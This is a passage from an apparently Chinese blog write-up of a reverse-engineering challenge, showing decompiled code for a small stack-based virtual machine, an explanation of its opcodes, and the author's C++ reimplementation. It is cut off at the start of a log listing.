class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">vmrun</span><span class="params">(<span class="type">char</span> *input, <span class="type">char</span> *vmcode)</span></span><br><span class="line">&#123;</span><br><span class="line">  LinkEntry *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> opcode; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// r14d</span></span><br><span class="line">  <span class="type">char</span> *PC; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v10; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// ebx</span></span><br><span class="line">  LinkEntry *v13; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v14; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v17; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v18; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v19; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v20; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v21; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v22; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v23; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// ebx</span></span><br><span class="line">  LinkEntry *v26; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v29; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> *v30; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v31; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v33; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v34; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v35; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v36; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v37; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v38; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v39; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v40; <span class="comment">// rcx</span></span><br><span class="line">  LinkEntry *v41; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v42; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v43; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v44; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v45; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v46; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v48; <span class="comment">// [rsp+58h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  opcode = *vmcode - <span class="number">16</span>;</span><br><span class="line">  v5 = v48;</span><br><span class="line">  PC = vmcode + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( opcode )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = &amp;v2-&gt;val;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v7 = *v9;</span><br><span class="line">          <span class="built_in">free</span>(v9);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = &amp;v2-&gt;val;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v8 = *v10;</span><br><span class="line">            <span class="built_in">free</span>(v10);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v8 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0x80000000</span>;</span><br><span class="line">          v8 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v11-&gt;val = v7 % v8;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_53;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        v12 = *PC;</span><br><span class="line">        v13 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        ++PC;</span><br><span class="line">        v13-&gt;next = v2;</span><br><span class="line">        v2 = v13;</span><br><span class="line">        v13-&gt;val = v12;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v5 = *v14;</span><br><span class="line">          <span class="built_in">free</span>(v14);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v15 = *v17;</span><br><span class="line">          <span class="built_in">free</span>(v17);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v18 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v16 = *v18;</span><br><span class="line">            <span class="built_in">free</span>(v18);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v16 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v15 = <span class="number">0x80000000</span>;</span><br><span class="line">          v16 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v19 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v19-&gt;next = v2;</span><br><span class="line">        v2 = v19;</span><br><span class="line">        v19-&gt;val = v15 * v16;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v22 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v20 = *v22;</span><br><span class="line">          <span class="built_in">free</span>(v22);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v23 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v21 = *v23;</span><br><span class="line">            <span class="built_in">free</span>(v23);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v21 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v20 = <span class="number">0x80000000</span>;</span><br><span class="line">          v21 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v24 = v21 + v20;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_52;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        sub_1400011B0(<span class="string">&quot;%c&quot;</span>, v5);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        v25 = *input;</span><br><span class="line">        v26 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v26-&gt;next = v2;</span><br><span class="line">        v2 = v26;</span><br><span class="line">        v26-&gt;val = v25;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v29 = &amp;v2-&gt;val;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v27 = *v29;</span><br><span class="line">          <span class="built_in">free</span>(v29);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v30 = &amp;v2-&gt;val;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v28 = *v30;</span><br><span class="line">            <span class="built_in">free</span>(v30);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v28 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LOBYTE(v27) = <span class="number">0</span>;</span><br><span class="line">          v28 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v31 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v31-&gt;next = v2;</span><br><span class="line">        v2 = v31;</span><br><span class="line">        v31-&gt;val = (v28 &gt;&gt; v27) &amp; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v34 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v32 = *v34;</span><br><span class="line">          <span class="built_in">free</span>(v34);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v35 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v33 = *v35;</span><br><span class="line">            <span class="built_in">free</span>(v35);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v33 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v32 = <span class="number">0x80000000</span>;</span><br><span class="line">          v33 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v36 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v36-&gt;next = v2;</span><br><span class="line">        v2 = v36;</span><br><span class="line">        v36-&gt;val = v32 ^ v33;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        ++input;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xA</span>u:</span><br><span class="line">        <span class="keyword">return</span> v5;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB</span>u:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v39 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v37 = *v39;</span><br><span class="line">          <span class="built_in">free</span>(v39);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v40 = (<span class="type">unsigned</span> <span class="type">int</span> *)v2;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v38 = *v40;</span><br><span class="line">            <span class="built_in">free</span>(v40);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v38 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v37 = <span class="number">0x80000000</span>;</span><br><span class="line">          v38 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v41 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v41-&gt;next = v2;</span><br><span class="line">        v2 = v41;</span><br><span class="line">        v41-&gt;val = v37 - v38;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC</span>u:</span><br><span class="line">        <span class="keyword">if</span> ( v2 )</span><br><span class="line">        &#123;</span><br><span class="line">          v44 = &amp;v2-&gt;val;</span><br><span class="line">          v2 = v2-&gt;next;</span><br><span class="line">          v42 = *v44;</span><br><span class="line">          <span class="built_in">free</span>(v44);</span><br><span class="line">          <span class="keyword">if</span> ( v2 )</span><br><span class="line">          &#123;</span><br><span class="line">            v45 = &amp;v2-&gt;val;</span><br><span class="line">            v2 = v2-&gt;next;</span><br><span class="line">            v43 = *v45;</span><br><span class="line">            <span class="built_in">free</span>(v45);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v43 = <span class="number">0x80000000</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v42 = <span class="number">0x80000000</span>;</span><br><span class="line">          v43 = <span class="number">0x80000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v11 = (LinkEntry *)j__malloc_base(<span class="number">0x10</span>uLL);</span><br><span class="line">        v24 = v42 / v43;</span><br><span class="line">LABEL_52:</span><br><span class="line">        v11-&gt;val = v24;</span><br><span class="line">LABEL_53:</span><br><span class="line">        v11-&gt;next = v2;</span><br><span class="line">        v2 = v11;</span><br><span class="line">LABEL_54:</span><br><span class="line">        v46 = *PC++;</span><br><span class="line">        opcode = v46 - <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span> ( opcode &lt;= <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">LABEL_57:</span><br><span class="line">        sub_1400011B0(<span class="string">&quot;WTF are u doinggg...&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恢复结构体之后这个 vm 还是很一目了然的，下面解释一下各个 opcode 的作用。</p><ul><li>0：取模操作（先弹出的值在运算符左侧）</li><li>1：push 操作</li><li>2：pop 操作</li><li>3：乘法操作</li><li>4：加法操作</li><li>5：输出</li><li>6：取输入指针</li><li>7：右移位后取最低位（先弹出的值在运算符右侧）</li><li>8：异或操作</li><li>9：输入指针+1</li><li>10：返回</li><li>11：减法操作（先弹出的值在运算符左侧）</li><li>12：除法操作（先弹出的值在运算符左侧）</li></ul><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>同时可以根据操作自己实现虚拟机，这里已经很清楚是栈的数据结构了就直接用 <code>std::stack</code> 实现即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt;s;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">0x10000</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getstackval</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> val=<span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">if</span>(s.<span class="built_in">size</span>())&#123;</span><br><span class="line">val=s.<span class="built_in">top</span>();</span><br><span class="line">s.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushstackval</span><span class="params">(<span class="type">int</span> val)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;push val %d\n&quot;</span>,val);</span><br><span class="line">s.<span class="built_in">push</span>(val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd=<span class="built_in">open</span>(<span class="string">&quot;./quest&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="type">size_t</span> ret=<span class="built_in">read</span>(fd,buffer,<span class="number">0x10000</span>);</span><br><span class="line"><span class="type">char</span> *PC=buffer;</span><br><span class="line"><span class="type">int</span> reg1,reg2,reg3;</span><br><span class="line"><span class="type">char</span> input[]=<span class="string">&quot;flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaa&#125;&quot;</span>;</span><br><span class="line"><span class="type">char</span> *p=input;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">char</span> opcode=*PC<span class="number">-0x10</span>;</span><br><span class="line"><span class="type">char</span> operand;</span><br><span class="line">PC++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2%reg3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d %% %d=%d&quot;</span>,reg2,reg3,reg2%reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">operand=*PC++;</span><br><span class="line"><span class="built_in">pushstackval</span>(operand);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">reg1=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pop %d to reg1\n&quot;</span>,reg1);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d*%d=%d\n&quot;</span>,reg2,reg3,reg2*reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2*reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d+%d=%d\n&quot;</span>,reg2,reg3,reg2+reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2+reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;output a char %c\n&quot;</span>,reg1);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;get %d input\n&quot;</span>,p-input<span class="number">+1</span>,*p);</span><br><span class="line"><span class="built_in">pushstackval</span>(*p);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc (%d&gt;&gt;%d)&amp;1=%d\n&quot;</span>,reg2,reg3,(reg2&gt;&gt;reg3)&amp;<span class="number">1</span>);</span><br><span class="line"><span class="built_in">pushstackval</span>((reg2&gt;&gt;reg3)&amp;<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d^%d=%d\n&quot;</span>,reg2,reg3,reg2^reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2^reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">p++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;retval=%d\n&quot;</span>,reg1);</span><br><span class="line"><span class="keyword">return</span> reg1;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d-%d=%d\n&quot;</span>,reg2,reg3,reg2-reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2-reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d/%d=%f\n&quot;</span>,reg2,reg3,reg2/reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2/reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;invalid op&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面节选一段log</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 